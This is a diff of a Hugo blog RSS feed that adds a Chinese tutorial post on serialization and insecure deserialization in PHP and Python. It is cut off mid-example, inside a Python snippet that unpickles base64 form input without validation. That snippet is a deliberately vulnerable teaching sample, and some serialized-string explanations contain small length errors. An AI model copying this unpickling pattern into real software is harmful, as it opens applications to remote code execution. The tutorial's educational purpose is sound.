@@ -7,7 +7,581 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Yerucrem</copyright>
-        <lastBuildDate>Tue, 15 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/categories/web%E5%9F%BA%E7%A1%80/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 24 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/categories/web%E5%9F%BA%E7%A1%80/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>反序列化-1</title>
+        <link>https://Yerucrem.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</link>
+        <pubDate>Thu, 24 Apr 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-8880144_1920.png" alt="Featured image of post 反序列化-1" /&gt;&lt;h2 id=&#34;重要概念&#34;&gt;重要概念
+&lt;/h2&gt;&lt;h3 id=&#34;序列化&#34;&gt;序列化
+&lt;/h3&gt;&lt;p&gt;把序列化想象成早上收拾书包。你需要把书、笔记本、午餐盒和水瓶整理好放进书包里。序列化就像把不同的信息（比如笔记）放在一起，方便存储或发送给朋友。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132745357.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424132745357&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，以便根据需要进行存储、传输和重构。对于需要在系统不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序），此功能至关重要。在 PHP 中，此过程使用 &lt;code&gt;serialize()&lt;/code&gt; 函数执行。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132826851.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424132826851&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$noteArray&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;My THM Note&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Welcome to THM!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$serialisedNote&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$noteArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// Converting the note into a storable format
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;note.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$serialisedNote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// Saving the serialised note to a file
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;以下输出显示了 &lt;code&gt;note.txt&lt;/code&gt; 文件中的序列化字符串，其中包含笔记结构和内容的详细信息。它以一种易于保存或传输的方式存储。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;序列化注释&lt;/strong&gt; ： &lt;code&gt;a:2:{s:5:&amp;quot;title&amp;quot;;s:12:&amp;quot;My THM Note&amp;quot;;s:7:&amp;quot;content&amp;quot;;s:12:&amp;quot;Welcome to THM!&amp;quot;;}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;反序列化&#34;&gt;反序列化
+&lt;/h3&gt;&lt;p&gt;想象一下，你到了学校，需要用到今天早上打包好的所有东西。反序列化就像你上课时打开书包，把每件物品都拿出来，这样一整天都能用到。当你打开书包去拿书本和午餐时，反序列化会把打包好的数据重新转换成你可以使用的东西。反序列化是将格式化的数据转换回对象的过程。这对于从文件、数据库或网络检索数据，并将其恢复到原始状态以供应用程序使用至关重要。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132845907.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424132845907&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;按照我们前面的例子，下面是如何在 PHP 中反序列化注释数据：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$serialisedNote&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;note.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// Reading the serialised note from the file
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$noteArray&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$serialisedNote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// Converting the serialised string back into a PHP array
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Title: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$noteArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$noteArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;content&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这段代码从文件中读取序列化的笔记，并将其转换回数组，从而有效地重建原始笔记。讨论序列化也需要讨论安全性。就像你不希望有人篡改你的书包一样，不安全的反序列化可能会导致软件应用程序中出现严重的安全漏洞。攻击者可能会篡改序列化对象以执行未经授权的操作或窃取数据。&lt;/p&gt;
+&lt;h2 id=&#34;序列化格式&#34;&gt;序列化格式
+&lt;/h2&gt;&lt;p&gt;虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但其基本原理是一致的。众所周知，序列化是将对象的状态转换为&lt;strong&gt;易于存储或传输&lt;/strong&gt;，并在以后重建的格式的过程。无论是 Java、Python、.NET 还是 PHP ，每种语言都实现了序列化，以适应其环境固有的特定功能或安全措施。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132956858.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424132956858&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;与利用用户输入的即时处理的其他常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次的交互，通常会操纵其组件的基本行为。&lt;/p&gt;
+&lt;p&gt;现在，让我们探索如何在不同的语言中明确处理序列化，探索其功能、语法和独特的特性。&lt;/p&gt;
+&lt;h3 id=&#34;php-序列化&#34;&gt;PHP 序列化
+&lt;/h3&gt;&lt;p&gt;在 PHP 中，序列化是使用 &lt;code&gt;serialize()&lt;/code&gt; 函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包含各种数据类型，例如字符串、数组和对象，从而使其具有唯一性。为了说明这一点，我们以一个笔记应用程序为例，用户可以在其中保存和检索他们的笔记。我们将创建一个名为 &lt;strong&gt;Notes&lt;/strong&gt; 的 PHP 类来表示每条笔记，并处理序列化和反序列化。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Notes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$Notescontent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Notescontent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在我们的 Notes 应用中，当用户保存笔记时，我们会使用 PHP 的 &lt;code&gt;serialize()&lt;/code&gt; 函数序列化 Notes 类对象。这会将对象转换为可存储在文件或数据库中的字符串表示形式。我们来看看以下序列化 Notes 类对象的代码片段：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$note&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Notes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;TEST123&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$serialized_note&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;序列化后它将生成如下所示的输出&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Notes&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;TEST123&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;让我们解码输出：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;O:5:&amp;quot;Notes&amp;quot;:1:&lt;/code&gt; ：此部分表示序列化数据代表 &lt;strong&gt;Notes&lt;/strong&gt; 类的对象，该对象具有一个属性。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;s:7:&amp;quot;content&amp;quot;&lt;/code&gt; ：这表示属性名称“ &lt;strong&gt;content&lt;/strong&gt; ”，长度为 7 个字符。在序列化数据中，字符串用 &lt;code&gt;s&lt;/code&gt; 表示，后跟字符串长度，字符串用双引号括起来。整数用 &lt;code&gt;i&lt;/code&gt; 表示 ，后跟不带引号的数值。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;s:14:&amp;quot;TEST123&amp;quot;&lt;/code&gt; ：这是&lt;strong&gt;内容&lt;/strong&gt;属性的值，长度为 7 个字符。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;魔法方法&#34;&gt;魔法方法
+&lt;/h3&gt;&lt;h4 id=&#34;php&#34;&gt;PHP
+&lt;/h4&gt;&lt;p&gt;PHP 提供了一些在序列化过程中起着至关重要作用的&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/en/language.oop5.magic.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;魔术方法 &lt;/a&gt;。下面列出了一些重要的方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;__sleep()&lt;/code&gt; ：此方法在对象序列化之前调用。它可以清理资源，例如数据库连接，并返回一个需要序列化的属性名称数组。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;__wakeup()&lt;/code&gt; ：此方法在反序列化时调用。它可以重新建立对象正常运行所需的任何连接。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;__serialize()&lt;/code&gt; ：从 PHP 7.4 开始，此方法允许您通过返回表示对象序列化形式的数组来自定义序列化数据。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;__unserialize()&lt;/code&gt; ： &lt;code&gt;__serialize()&lt;/code&gt; 的对应函数允许自定义从序列化数据中恢复对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424133605647.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424133605647&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;python&#34;&gt;PYTHON
+&lt;/h4&gt;&lt;p&gt;Python 使用名为 &lt;strong&gt;Pickle&lt;/strong&gt; 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件或通过网络传输。Pickling 对  Python 开发人员来说是一个强大的工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 和 PHP 中遵循相同的笔记应用程序。以下是 &lt;code&gt;app.py&lt;/code&gt; 类的代码片段：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pickle&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;serialized_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;serialized_data&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;notes_obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serialized_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
